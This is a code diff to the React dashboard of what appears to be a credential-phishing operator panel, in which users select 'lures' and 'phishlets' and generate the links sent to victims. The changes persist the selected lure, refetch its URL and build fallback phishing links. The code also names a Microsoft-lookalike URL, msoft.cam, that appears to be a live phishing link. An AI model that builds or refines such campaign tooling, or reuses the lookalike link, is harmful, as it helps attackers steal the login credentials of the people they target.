@@ -305,6 +305,7 @@ export default function Dashboard() {
 
     // Save the selected lure ID to localStorage immediately
     if (selectedLure && selectedLure.id) {
+      console.log("Saving lure ID to localStorage:", selectedLure.id);
       localStorage.setItem("selectedLureId", selectedLure.id);
     }
 
@@ -368,6 +369,7 @@ export default function Dashboard() {
           linkPath: selectedLure.path.startsWith("/")
             ? selectedLure.path.substring(1)
             : selectedLure.path,
+          lureId: selectedLure.id, // Send the lure ID with settings updates
         }),
       });
 
@@ -729,6 +731,66 @@ export default function Dashboard() {
     };
   }, [lures, fullLink]);
 
+  // Add a new useEffect to update UI when lures list changes
+  useEffect(() => {
+    // If we have lures and a selected lure (or one in localStorage), make sure dropdown shows it
+    if (lures.length > 0) {
+      const savedLureId = localStorage.getItem("selectedLureId");
+
+      // If there's a selected lure, ensure the dropdown reflects it
+      if (selectedLure) {
+        // Make sure the dropdown selection matches the current selectedLure
+        // This ensures dropdown stays consistent after navigation
+        console.log(
+          "Ensuring dropdown selection matches selectedLure:",
+          selectedLure.id
+        );
+      }
+      // If no selected lure but we have one in localStorage, restore it
+      else if (savedLureId) {
+        const savedLure = lures.find((lure) => lure.id === savedLureId);
+        if (savedLure) {
+          console.log("Restoring selectedLure from localStorage:", savedLureId);
+          setSelectedLure(savedLure);
+
+          // Also restore the URL
+          const lureIndex = lures.findIndex((lure) => lure.id === savedLureId);
+          if (lureIndex >= 0) {
+            setLinkLoading(true);
+            fetch(`/api/lure-url?lureIndex=${lureIndex}`)
+              .then((response) => {
+                if (response.ok) return response.json();
+                throw new Error("Failed to fetch lure URL");
+              })
+              .then((data) => {
+                if (data.url && data.url !== "https://msoft.cam/wYyGBBeI") {
+                  setFullLink(data.url);
+                } else {
+                  // Use fallback
+                  setFullLink(
+                    `${savedLure.phishlet}.${
+                      savedLure.hostname || window.location.hostname
+                    }${savedLure.path}`
+                  );
+                }
+              })
+              .catch(() => {
+                // Use fallback on error
+                setFullLink(
+                  `${savedLure.phishlet}.${
+                    savedLure.hostname || window.location.hostname
+                  }${savedLure.path}`
+                );
+              })
+              .finally(() => {
+                setLinkLoading(false);
+              });
+          }
+        }
+      }
+    }
+  }, [lures, selectedLure]);
+
   const columns: TableColumn[] = [
     {
       header: "ID",
@@ -886,7 +948,7 @@ export default function Dashboard() {
                   >
                     <option value="-1">Select link</option>
                     {lures.map((lure, index) => (
-                      <option key={index} value={index}>
+                      <option key={lure.id} value={index}>
                         {lure.phishlet} - {lure.path}
                       </option>
                     ))}
